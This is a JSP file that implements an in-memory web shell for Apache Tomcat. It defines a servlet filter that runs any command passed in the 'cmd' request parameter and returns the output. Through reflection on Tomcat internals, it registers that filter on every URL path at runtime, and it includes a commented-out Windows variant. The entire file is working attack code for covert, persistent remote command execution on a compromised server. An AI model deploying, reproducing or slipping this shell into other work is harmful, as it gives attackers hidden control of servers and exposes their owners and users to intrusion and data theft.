<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.Context" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext" %>
<%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import = "org.apache.catalina.core.StandardContext" %>

<!-- tomcat 8/9 -->
<%@ page import = "org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import = "org.apache.tomcat.util.descriptor.web.FilterDef" %>

<!-- tomcat 7 -->
<%--<%@ page import = "org.apache.catalina.deploy.FilterMap" %>--%>
<%--<%@ page import = "org.apache.catalina.deploy.FilterDef" %>--%>

<%@ page import = "javax.servlet.*" %>
<%@ page import = "java.io.IOException" %>
<%@ page import = "java.lang.reflect.Constructor" %>
<%@ page import = "java.lang.reflect.Field" %>
<%@ page import = "java.util.Map" %>
<%@ page import="javax.servlet.Filter" %>
<%@ page import="javax.servlet.FilterConfig" %>
<%@ page import="javax.servlet.ServletRequest" %>
<%@ page import="javax.servlet.ServletException" %>
<%@ page import="javax.servlet.ServletResponse" %>
<%@ page import="javax.servlet.FilterChain" %>
<%@ page import="javax.servlet.ServletContext" %>
<%@ page import="javax.servlet.DispatcherType" %>
<%@ page import="com.rs.servlet.filterDemo" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="javax.servlet.ServletOutputStream" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>

<%
    class filterDemo implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            String cmd = servletRequest.getParameter("cmd");
            if (cmd!= null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse.getOutputStream().flush();
                servletResponse.getOutputStream().close();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }

        @Override
        public void destroy() {

        }

    }
%>

<%--<%--%>
<%--    class filterDemo implements Filter {--%>
<%--        @Override--%>
<%--        public void init(FilterConfig filterConfig) throws ServletException {--%>
<%--        }--%>
<%--        @Override--%>
<%--        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {--%>
<%--            try{--%>
<%--                if(servletRequest.getParameter("cmd") != null){--%>
<%--                    Process ps = Runtime.getRuntime().exec("cmd.exe /c "+servletRequest.getParameter("cmd"));--%>
<%--                    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));--%>
<%--                    ServletOutputStream out = servletResponse.getOutputStream();--%>

<%--                    String s = null;--%>
<%--                    String output = "";--%>
<%--                    while((s = br.readLine()) != null){--%>
<%--                        output += s + "\n";--%>
<%--                    }--%>
<%--                    out.println(output);--%>
<%--                    out.flush();--%>
<%--                    out.close();--%>
<%--                }--%>
<%--            }catch (Exception e){--%>
<%--                e.printStackTrace();--%>
<%--            }--%>
<%--            filterChain.doFilter(servletRequest, servletResponse);--%>
<%--        }--%>


<%--        @Override--%>
<%--        public void destroy() {--%>

<%--        }--%>

<%--    }--%>

<%--%>--%>


<%

    ServletContext servletContext = (ServletContext) request.getServletContext();
    ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) servletContext;
    Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
    appCtxFacadeField.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext) appCtxFacadeField.get(appCtxFacade);
    Field appCtxField = ApplicationContext.class.getDeclaredField("context");
    appCtxField.setAccessible(true);
    StandardContext standardContext = (StandardContext) appCtxField.get(appCtx);
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

//    ServletContext servletContext = (ServletContext) request.getSession().getServletContext();
//    Field appctx = servletContext.getClass().getDeclaredField("context");
//    appctx.setAccessible(true);
//    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
//    Field stdctx = applicationContext.getClass().getDeclaredField("context");
//    stdctx.setAccessible(true);
//    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
//    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
//    Configs.setAccessible(true);
//    Map filterConfigs = (Map) Configs.get(standardContext);

    String name = "filterDemo";
    if (filterConfigs.get(name) == null){
        filterDemo filter = new filterDemo();
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);

        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

        filterConfigs.put(name,filterConfig);
        response.getWriter().println("Inject success!");
    }
    else{
        response.getWriter().println("Inject!");
    }
%>
